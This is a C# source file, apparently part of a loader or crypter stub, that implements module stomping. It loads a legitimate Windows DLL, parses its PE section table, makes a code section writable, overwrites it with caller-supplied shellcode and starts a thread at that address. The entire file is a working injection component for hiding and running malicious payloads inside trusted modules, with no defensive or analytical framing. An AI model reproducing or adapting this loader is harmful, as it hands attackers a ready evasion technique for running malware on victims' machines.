using System;
using System.Runtime.InteropServices;

namespace NRE.Stub.Injection
{
    /// <summary>
    /// Module stomping: load a legitimate DLL, overwrite its .text/code section with shellcode, then trigger execution.
    /// </summary>
    public static class ModuleStomping
    {
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint IMAGE_SCN_CNT_CODE = 0x20;
        private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibraryW(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        public static Tuple<IntPtr, IntPtr> StompModule(string dllName, byte[] shellcode)
        {
            if (string.IsNullOrEmpty(dllName) || shellcode == null || shellcode.Length == 0) return null;
            IntPtr hMod = LoadLibraryW(dllName);
            if (hMod == IntPtr.Zero) return null;
            IntPtr baseAddr = hMod;
            byte[] peHeader = new byte[4096];
            Marshal.Copy(baseAddr, peHeader, 0, Math.Min(4096, 0x1000));
            int eLfanew = BitConverter.ToInt32(peHeader, 0x3C);
            if (eLfanew <= 0 || eLfanew + 248 > peHeader.Length) return null;
            ushort numSections = BitConverter.ToUInt16(peHeader, eLfanew + 6);
            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(peHeader, eLfanew + 20);
            int sectionTableOff = eLfanew + 24 + sizeOfOptionalHeader;
            for (int i = 0; i < numSections; i++)
            {
                int secOff = sectionTableOff + i * 40;
                uint characteristics = BitConverter.ToUInt32(peHeader, secOff + 36);
                if ((characteristics & IMAGE_SCN_CNT_CODE) == 0 && (characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
                    continue;
                uint virtualAddr = BitConverter.ToUInt32(peHeader, secOff + 12);
                uint virtualSize = BitConverter.ToUInt32(peHeader, secOff + 8);
                if (shellcode.Length > virtualSize) continue;
                IntPtr sectionAddr = (IntPtr)(baseAddr.ToInt64() + (int)virtualAddr);
                uint old;
                if (!VirtualProtect(sectionAddr, (UIntPtr)virtualSize, PAGE_EXECUTE_READWRITE, out old))
                    continue;
                try
                {
                    Marshal.Copy(shellcode, 0, sectionAddr, shellcode.Length);
                    return Tuple.Create(sectionAddr, baseAddr);
                }
                finally
                {
                    VirtualProtect(sectionAddr, (UIntPtr)virtualSize, old, out old);
                }
            }
            return null;
        }

        public static bool StompAndExecute(string dllName, byte[] shellcode)
        {
            var result = StompModule(dllName, shellcode);
            if (result == null) return false;
            return StartThreadAt(result.Item1);
        }

        private static bool StartThreadAt(IntPtr startAddress)
        {
            uint tid;
            IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, startAddress, IntPtr.Zero, 0, out tid);
            if (hThread == IntPtr.Zero) return false;
            CloseHandle(hThread);
            return true;
        }
    }
}
